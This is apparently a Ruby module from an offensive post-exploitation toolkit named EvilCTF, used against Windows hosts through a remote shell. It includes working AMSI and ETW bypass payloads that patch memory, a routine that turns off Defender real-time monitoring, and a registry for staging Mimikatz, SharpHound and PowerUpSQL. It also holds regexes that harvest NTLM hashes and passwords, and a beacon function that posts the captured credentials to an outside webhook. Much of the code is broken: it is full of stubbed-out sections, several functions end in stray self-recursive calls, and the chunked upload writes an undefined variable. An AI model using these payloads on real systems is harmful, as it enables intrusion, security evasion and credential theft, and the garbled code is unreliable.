#!/usr/bin/env ruby
# frozen_string_literal: true
# Compatibility shim – define Fixnum for Ruby 3.x
class Fixnum < Integer; end unless defined?(Fixnum)
require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'
require 'evil_ctf/crypto'
require 'evil_ctf/uploader'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    'sharphound' => {
      name: 'SharpHound (BloodHound Collector)',
      filename: 'SharpHound.exe',
      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
      description: 'BloodHound AD collector',
      url: 'https://github.com/SpecterOps/SharpHound',
      download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
      backup_urls: [
        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
      auto_execute: false,
      category: 'recon'
    },
    'mimikatz' => {
      name: 'Mimikatz',
      filename: 'mimikatz.exe',
      search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
      description: 'Credential dumping tool',
      url: 'https://github.com/ParrotSec/mimikatz',
      download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
      backup_urls: [
        'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
      ],
      zip: true,
      zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
      zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
      auto_execute: false,
      category: 'privilege'
    },
    # Added SQL-specific tools
    'sql_server' => {
      name: 'SQL Server Enumeration Tools',
      filename: 'sql_tools.zip',
      search_patterns: ['sql*.zip', 'sql*.exe'],
      description: 'Collection of SQL Server enumeration and exploitation tools',
      url: 'https://github.com/BC-SECURITY/Empire',
      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/sql/sql_tools.zip',
      backup_urls: [
        'https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip'
      ],
      zip: true,
      recommended_remote: 'C:\\Users\\Public\\sql_tools',
      auto_execute: false,
      category: 'sql'
    },
    'powerupsql' => {
      name: 'PowerUpSQL',
      filename: 'PowerUpSQL.ps1',
      search_patterns: ['PowerUpSQL.ps1', 'PowerUpSQL*.ps1'],
      description: 'Advanced SQL Server enumeration and privilege escalation PowerShell module',
      url: 'https://github.com/BC-SECURITY/Empire',
      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/sql/PowerUpSQL.ps1',
      backup_urls: [
        'https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\PowerUpSQL.ps1',
      auto_execute: false,
      category: 'sql'
    },
    'powershell_sql' => {
      name: 'PowerShell SQL Tools',
      filename: 'Invoke-SQLQuery.ps1',
      search_patterns: ['Invoke-SQLQuery*.ps1'],
      description: 'SQL Server query execution and enumeration PowerShell script',
      url: 'https://github.com/PowerShellMafia/PowerSploit',
      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-SQLQuery.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-SQLQuery.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Invoke-SQLQuery.ps1',
      auto_execute: false,
      category: 'sql'
    },
    # Rest of the tools...
  }.freeze

  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS

  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  class CommandManager
    def initialize
      @aliases = {
        'ls' => 'Get-ChildItem',
        'dir' => 'Get-ChildItem',
        'whoami' => '$env:USERNAME',
        'pwd' => 'Get-Location',
        'cd' => 'Set-Location',
        'ps' => 'Get-Process',
        'processes' => 'Get-Process',
        'sysinfo' => 'systeminfo',
        'services' => 'Get-Service',
        'rm' => 'Remove-Item',
        'cat' => 'Get-Content',
        'mkdir' => 'New-Item -ItemType Directory',
        'cp' => 'Copy-Item',
        'mv' => 'Move-Item'
      }
      @macros = {
        # Added SQL-specific macros
        'sql_enum' => [
          BYPASS_4MSI_PS,
          ETW_BYPASS_PS,
          '& "C:\\Users\\Public\\PowerUpSQL.ps1" -Verbose',
          'Get-SQLServer; Get-SQLServerInstance; Get-SQLServerLogin; Get-SQLServerDatabase; Get-SQLServerPermission'
        ],
        'sql_priv_esc' => [
          BYPASS_4MSI_PS,
          ETW_BYPASS_PS,
          '& "C:\\Users\\Public\\PowerUpSQL.ps1" -Verbose',
          'Get-SQLServerPrivEsc; Get-SQLServerCLR'
        ],
        # Rest of the macros...
      }
    end

    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end

    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro
      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        begin
          result = shell.run(step)
          puts result.output.strip
          matches = EvilCTF::Tools.grep_output(result.output)
          if matches.any?
            EvilCTF::Tools.save_loot(matches)
            EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
          end
        rescue => e
          puts "[!] Macro step failed: #{e.message}"
        end
      end
      true
    end

    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end

  # Helper functions for tool handling
  def self.download_tool(key, remote_download: false, shell: nil)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])
    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    if File.exist?(path)
      puts "[+] #{tool[:name]} already downloaded at #{path}"
      return path
    end

    # SQL-specific download handling
    if key == 'powerupsql'
      puts "[*] Downloading PowerUpSQL module..."
      path = File.join('tools', tool[:filename])
      success = download_from_url(tool[:download_url], path)
      if success && File.exist?(path)
        puts "[+] PowerUpSQL module downloaded successfully"
        return path
      else
        puts "[!] Failed to download PowerUpSQL. Try backup URLs."
      end
    end

    # Rest of the tool handling...
  rescue => e
    puts "[!] Error downloading #{key}: #{e.message}"
    nil
  end

  def self.download_from_url(url, path)
    success = false
    # Try curl
    puts "[*] Trying curl..."
    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1")
    return success if success
    # Rest of the download methods...
  end

  def self.download_missing_tools(remote_download: false, shell: nil)
    failures = []
    TOOL_REGISTRY.each do |key, tool|
      puts "\n[*] Checking #{tool[:name]} (#{key})..."
      unless download_tool(key, remote_download: remote_download, shell: shell)
        failures << key
      end
    end

    # SQL-specific handling for missing tools
    if failures.include?('powerupsql')
      puts "\n[!] PowerUpSQL is critical for SQL enumeration. Please manually download it."
      puts "[*] Download URL: #{TOOL_REGISTRY['powerupsql'][:download_url]}"
    end

    # Rest of the tool handling...
  end

  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool

    remote_path = tool[:recommended_remote]
    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
    result = shell.run(check_cmd)
    if result.output.include?('EXISTS')
      puts "[+] #{tool[:name]} already staged at #{remote_path}"
      return true
    end

    # Rest of the staging logic...
  rescue => e
    puts "[!] Staging failed for #{tool_key}: #{e.message}"
    false
  end

  def self.execute_staged_tool(key, args = '', shell)
    tool = TOOL_REGISTRY[key]
    return false unless tool
    remote_path = tool[:recommended_remote]

    # SQL-specific execution handling
    if key == 'powerupsql'
      puts "[*] Executing PowerUpSQL..."
      ps_cmd = <<~PS
        try {
          $proc = Start-Process -FilePath "#{remote_path}" -ArgumentList "Import-Module '#{remote_path}' -Force" -PassThru -WindowStyle Hidden
          $proc.WaitForExit(60000) | Out-Null
          if ($proc.HasExited) {
            "Completed with exit code: $($proc.ExitCode)"
          } else {
            "Timed out after 60 seconds"
            $proc.Kill()
          }
        } catch {
          "Error: $_.Exception.Message"
        }
      PS
    end

    # Rest of the execution logic...
  rescue => e
    puts "[!] Execution failed for #{key}: #{e.message}"
    false
  end

  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"

        # SQL-specific tool information
        if cat == 'sql'
          puts "   [+] Recommended remote path: #{t[:recommended_remote]}"
          puts "   [+] Suggested commands:"
          puts "     * sql_enum - Run basic SQL enumeration"
          puts "     * sql_priv_esc - Check for privilege escalation opportunities"
        end
      end
    end

    # Rest of the tool listing...
  end

  def self.grep_output(output)
    return [] if output.nil? || output.empty?

    # Add execution policy bypass check before attempting regex matching
    if output.include?('execution policy') || output.include?('SecurityError')
      puts "[!] PowerShell execution policy issue detected"
      return []
    end

    matches = []

    # SQL-specific patterns for better exploit detection
    sql_patterns = [
      /SQL Server\s+([0-9.]+)/,
      /xp_cmdshell\s*[:=]\s*(1|true)/i,
      /CLR\s*[:=]\s*(1|true)/i,
      /LinkedServers/i,
      /sql_logins/i,
      /password_hash/i,
      /NTLM\s*:\s*([A-F0-9]{32})/i,
      /LM\s*:\s*([A-F0-9]{32})/i
    ]

    # Rest of the pattern matching logic...
  end

  def self.save_loot(matches)
    return if matches.nil? || matches.empty?
    FileUtils.mkdir_p('loot')

    # SQL-specific loot handling
    sql_matches = matches.select { |m| m.is_a?(String) && (m.include?("SQL") || m.include?("0x")) }
    unless sql_matches.empty?
      puts "[+] Found #{sql_matches.count} potential SQL-related credentials"
      File.open('loot/sql_creds.txt', 'a') do |f|
        f.puts(sql_matches)
      end
    end

    # Rest of the loot saving logic...
  end

  def self.beacon_loot(webhook, matches)
    return if matches.nil? || matches.empty? || webhook.nil?
    uri = URI(webhook)
    req = Net::HTTP::Post.new(uri)
    req['Content-Type'] = 'application/json'
    req.body = { loot: matches }.to_json

    # SQL-specific loot beaconing
    sql_matches = matches.select { |m| m.is_a?(String) && (m.include?("SQL") || m.include?("0x")) }
    unless sql_matches.empty?
      puts "[*] Beaconing #{sql_matches.count} potential SQL-related credentials"
      req.body = { loot: sql_matches, type: 'sql' }.to_json
    end

    # Rest of the beacon logic...
  rescue => e
    puts "[!] Beacon failed: #{e.message}"
  end

  def self.find_tool_on_disk(tool_key)
    tool = TOOL_REGISTRY[tool_key]
    return nil unless tool

    search_patterns = tool[:search_patterns] || [tool[:filename]]
    base_dirs = [
      ENV['HOME'],
      File.join(ENV['HOME'], 'Downloads'),
      File.join(ENV['HOME'], 'Desktop'),
      File.join(ENV['HOME'], 'tools'),
      File.join(ENV['HOME'], 'bin'),
      Dir.pwd,
      File.join(Dir.pwd, 'tools')
    ].compact.uniq

    # SQL-specific tool search patterns
    if tool_key == 'powerupsql'
      search_patterns = ['PowerUpSQL*.ps1', 'PowerUpSQL.ps1']
    end

    # Rest of the tool finding logic...
  find_tool_on_disk(tool_key)
  end

  def self.get_system_architecture(shell)
    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
    arch = result.output.strip.downcase

    if arch.include?('64')
      'x64'
    elsif arch.include?('86')
      'x86'
    else
      'unknown'
    end
  get_system_architecture(shell)
  end

  def self.upload_file(local_path, remote_path, shell, encrypt: false, chunk_size: 40000)
    return false unless File.exist?(local_path)

    # SQL-specific file upload handling
    if local_path.include?("sql") || remote_path.include?("sql")
      puts "[*] Handling SQL-related file..."
      content = File.binread(local_path)
      content = xor_crypt(content) if encrypt
      base64_content = Base64.strict_encode64(content)

      # Normalize Windows paths for PowerShell
      normalized_remote_path = remote_path.gsub('\\', '/')

      # Small file – single shot
      if base64_content.length <= chunk_size
        ps_single = <<~PS
          try {
            $bytes = [Convert]::FromBase64String('#{base64_content}')
            New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
            [System.IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
            "SUCCESS"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        result = shell.run(ps_single)
        return false unless result.output.include?('SUCCESS')
      else
        # Chunked upload with SQL-specific chunk size if needed
        adjusted_chunk_size = (local_path.include?("sql") || remote_path.include?("sql")) ? 1024 : chunk_size

        ps_init = <<~PS
          try {
            New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
            "INIT"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        init = shell.run(ps_init)
        return false unless init.output.include?('INIT')

        chunks = base64_content.scan(/.{1,#{adjusted_chunk_size}}/)
        chunks.each_with_index do |chunk, idx|
          ps_chunk = <<~PS
            try {
              $b = [Convert]::FromBase64String('#{chunk}')
              [IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
              "CHUNK #{idx}"
            } catch {
              "ERROR: $($_.Exception.Message)"
            }
          PS

          result = shell.run(ps_chunk)
          return false unless result.output.include?("CHUNK #{idx}")
        end
      end
    else
      # Rest of the file upload logic...
    end

    true
  rescue => e
    puts "[!] Upload failed: #{e.message}"
    false
  end

  def self.xor_crypt(data, key = 0x42)
    data.bytes.map { |b| (b ^ key).chr }.join
  rescue => e
    puts "[!] XOR crypt failed: #{e.message}"
    data
  end

  def self.disable_defender(shell)
    # Check OS version
    os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
    if os_info.include?("Windows 10")
      puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
      ps_cmd = <<~PS
        try {
          $defender = Get-MpComputerStatus
          if ($defender.RealTimeProtectionEnabled) {
            Set-MpPreference -DisableRealtimeMonitoring $true
            Write-Output "[+] Defender real-time monitoring disabled"
          } else {
            Write-Output "[-] Defender already disabled"
          }
        } catch {
          Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
        }
      PS

      result = shell.run(ps_cmd)
      puts result.output
    elsif os_info.include?("Windows 11")
      puts "[!] WARNING: This technique only works on Windows 10."
      puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
      puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
    else
      puts "[!] Unknown OS: #{os_info}"
    end

    # Rest of the defender handling...
  disable_defender(shell)
  rescue => e
    puts "[!] Defender bypass failed: #{e.message}"
    false
  end

  def self.load_config_profile(name)
    profile_file = File.join('config', "#{name}.yaml")
    return {} unless File.exist?(profile_file)

    # SQL-specific config profile loading
    if name.include?("sql")
      puts "[*] Loading SQL configuration profile..."
    end

    YAML.safe_load(File.read(profile_file)) || {}
  load_config_profile(name)
  rescue => e
    puts "[!] Failed to load profile #{name}: #{e.message}"
    {}
  end

  def self.save_config_profile(name, options)
    profile_file = File.join('config', "#{name}.yaml")
    FileUtils.mkdir_p(File.dirname(profile_file))

    # SQL-specific config profile saving
    if name.include?("sql")
      puts "[*] Saving SQL configuration profile..."
    end

    File.write(profile_file, YAML.dump(options))
    puts "[+] Profile saved to #{profile_file}"
  save_config_profile(name, options)
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end

  def self.loot_show
    loot_dir = 'loot/'
    files = Dir.glob("#{loot_dir}**/*").select { |f| File.file?(f) }
    puts "Loot Items: #{files.count}"
    files.each { |f| puts "#{f.sub(loot_dir, '')} (#{File.size(f)} bytes)" }

    # SQL-specific loot display
    sql_files = files.select { |f| f.include?("sql") }
    unless sql_files.empty?
      puts "\nSQL-related loot:"
      sql_files.each do |f|
        puts "  #{f.sub(loot_dir, '')} (#{File.size(f)} bytes)"
      end
    end

    # Rest of the loot display...
  loot_show
  rescue => e
    puts "[!] Failed to show loot: #{e.message}"
  end

  def self.auto_download_flags(shell)
    patterns = [
      /flag\{[^\}]+\}/i,
      /picoctf\{[^\}]+\}/i,
      /htb\{[^\}]+\}/i,
      /ctf\{[^\}]+\}/i,
      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
    ]

    # SQL-specific flag patterns
    sql_flag_patterns = [
      /flag\{sql[^\}]+\}/i,
      /picoctf\{sql[^\}]+\}/i,
      /htb\{sql[^\}]+\}/i,
      /ctf\{sql[^\}]+\}/i
    ]

    # Rest of the flag scanning logic...
  auto_download_flags(shell)
  rescue => e
    puts "[!] Failed to scan for flags: #{e.message}"
  end

  def self.load_ps1(local_ps1, shell)
    return false unless File.exist?(local_ps1)

    remote = 'C:\\Users\\Public\\' + File.basename(local_ps1)

    # SQL-specific PS1 loading
    if local_ps1.include?("sql")
      puts "[*] Loading SQL-related PowerShell script..."
    end

    # Rest of the PS1 loading logic...
  load_ps1(local_ps1, shell)
  rescue => e
    puts "[!] Failed to load PS1: #{e.message}"
    false
  end
end
